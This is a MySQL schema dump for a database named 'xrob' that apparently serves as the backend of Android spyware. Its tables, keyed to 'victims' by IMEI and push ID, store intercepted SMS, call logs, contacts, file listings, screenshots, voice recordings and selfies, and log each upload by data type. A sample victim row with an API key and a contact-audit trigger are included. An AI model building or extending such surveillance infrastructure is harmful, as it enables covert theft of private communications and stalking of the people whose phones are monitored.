-- --------------------------------------------------------
-- Host:                         localhost
-- Server version:               5.6.24 - MySQL Community Server (GPL)
-- Server OS:                    Win32
-- HeidiSQL Version:             9.1.0.4867
-- --------------------------------------------------------

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET NAMES utf8mb4 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;

-- Dumping database structure for xrob
DROP DATABASE IF EXISTS `xrob`;
CREATE DATABASE IF NOT EXISTS `xrob` /*!40100 DEFAULT CHARACTER SET latin1 */;
USE `xrob`;


-- Dumping structure for table xrob.calls
DROP TABLE IF EXISTS `calls`;
CREATE TABLE IF NOT EXISTS `calls` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `victim_id` int(11) NOT NULL,
  `name` varchar(100) DEFAULT NULL,
  `phone` varchar(20) NOT NULL,
  `call_type` enum('IN','OUT','MISSED') NOT NULL,
  `called_at` timestamp NULL,
  `is_active` tinyint(4) NOT NULL DEFAULT '1',
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  CONSTRAINT `calls_ibfk_1` FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- Data exporting was unselected.


-- Dumping structure for table xrob.contacts
DROP TABLE IF EXISTS `contacts`;
CREATE TABLE IF NOT EXISTS `contacts` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `victim_id` int(11) NOT NULL,
  `android_contact_id`  INTEGER  NOT NULL,
  `name` varchar(100) DEFAULT NULL,
  `is_active` tinyint(4) NOT NULL DEFAULT '1',
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  CONSTRAINT `contacts_ibfk_1` FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

DROP TABLE IF EXISTS `contact_names_audit`;
CREATE TABLE IF NOT EXISTS `contact_names_audit` (
  `id` INT(11) NOT NULL AUTO_INCREMENT,
  `contact_id` INT(11) NOT NULL,
  `name` varchar(100) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY(id),
  FOREIGN KEY (contact_id) REFERENCES contacts(id) ON DELETE CASCADE ON UPDATE CASCADE
);



DROP TABLE IF EXISTS `phone_numbers`;
CREATE TABLE IF NOT EXISTS `phone_numbers`(
  `id` INT(11) NOT NULL AUTO_INCREMENT,
  `contact_id` INT NOT NULL,
  `phone` VARCHAR(20) NOT NULL,
  `phone_type` VARCHAR (20) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  FOREIGN KEY (contact_id) REFERENCES contacts(id) ON DELETE CASCADE ON UPDATE CASCADE
);
-- Data exporting was unselected.


-- Dumping structure for table xrob.deliveries
DROP TABLE IF EXISTS `deliveries`;
CREATE TABLE IF NOT EXISTS `deliveries` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `victim_id` int(11) NOT NULL,
  `data_type` enum('messages','call_logs','contacts','file_logs','media_screen_shot','media_voice','media_selfie') NOT NULL,
  `error` tinyint(4) NOT NULL,
  `message` text NOT NULL,
  `server_error` tinyint(4) NOT NULL DEFAULT 0,
  `server_error_message` text DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  CONSTRAINT `deliveries_ibfk_1` FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- Data exporting was unselected.


-- Dumping structure for table xrob.files
DROP TABLE IF EXISTS `files`;
CREATE TABLE IF NOT EXISTS `files` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `victim_id` int(11) NOT NULL,
  `real_filename` text NOT NULL,
  `file_path` text NOT NULL,
  `size` int(11) NOT NULL,
  `is_active` tinyint(4) NOT NULL DEFAULT '1',
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  CONSTRAINT `files_ibfk_1` FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- Data exporting was unselected.


-- Dumping structure for table xrob.media
DROP TABLE IF EXISTS `media`;
CREATE TABLE IF NOT EXISTS `media` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `victim_id` int(11) NOT NULL,
  `name` varchar(100) NOT NULL,
  `_type` enum('SCREENSHOT','VOICE','SELFIE') NOT NULL,
  `captured_at` timestamp NULL,
  `is_active` tinyint(4) NOT NULL DEFAULT '1',
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  CONSTRAINT `media_ibfk_1` FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- Data exporting was unselected.


-- Dumping structure for table xrob.messages
DROP TABLE IF EXISTS `messages`;
CREATE TABLE IF NOT EXISTS `messages` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `victim_id` int(11) NOT NULL,
  `phone` varchar(20) NOT NULL,
  `content` text NOT NULL,
  `_type` ENUM ('inbox','outbox') NOT NULL,
  `delivered_at` BIGINT NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  CONSTRAINT `messages_ibfk_1` FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- Data exporting was unselected.


-- Dumping structure for table xrob.victims
DROP TABLE IF EXISTS `victims`;
CREATE TABLE IF NOT EXISTS `victims` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) DEFAULT NULL,
  `gcm_id` text,
  `gcm_updated_at` timestamp NULL,
  `api_key` varchar(10) NOT NULL,
  `imei` varchar(16) NOT NULL,
  `actions` varchar(100) DEFAULT NULL,
  `is_active` tinyint(4) NOT NULL DEFAULT '1',
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `imei` (`imei`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

  INSERT INTO victims (name,api_key,imei) VALUES ('Shifar','YRxxhK7pIi',12345678);

  /* Change the delimiter so we can use ";" within the CREATE TRIGGER */
    DELIMITER $$

    CREATE TRIGGER after_contacts_update
    AFTER UPDATE ON contacts
    FOR EACH ROW BEGIN
    IF OLD.name <> NEW.name THEN
    INSERT INTO contact_names_audit
    SET contact_id = OLD.id,
    name = OLD.name;
    END IF;
    END$$
    /* This is now "END$$" not "END;" */

    /* Reset the delimiter back to ";" */
    DELIMITER ;

-- Data exporting was unselected.
/*!40101 SET SQL_MODE=IFNULL(@OLD_SQL_MODE, '') */;
/*!40014 SET FOREIGN_KEY_CHECKS=IF(@OLD_FOREIGN_KEY_CHECKS IS NULL, 1, @OLD_FOREIGN_KEY_CHECKS) */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
